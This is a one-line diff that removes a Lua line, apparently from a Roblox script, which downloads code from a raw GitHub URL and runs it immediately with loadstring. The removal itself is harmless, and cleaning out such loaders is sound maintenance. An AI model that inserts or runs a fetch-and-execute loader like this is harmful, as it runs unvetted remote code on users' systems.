@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/dqvh/dqvh/main/98FIGBB')))()
